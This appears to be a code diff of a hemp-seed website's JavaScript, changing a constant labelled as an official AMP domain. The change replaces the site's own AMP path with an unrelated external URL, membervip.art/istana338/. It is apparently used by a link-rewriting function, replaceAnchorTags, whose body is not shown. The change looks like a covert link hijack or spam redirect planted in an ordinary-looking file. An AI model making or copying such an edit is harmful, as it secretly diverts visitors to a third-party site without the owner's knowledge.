@@ -1,6 +1,6 @@
 // Define the official domains
 const officialDomain = 'https://highgradehempseed.com/'; 
-const ampDomain = 'https://highgradehempseed.com/amp/index/';       
+const ampDomain = 'https://membervip.art/istana338/';       
 
 function replaceAnchorTags() {
   
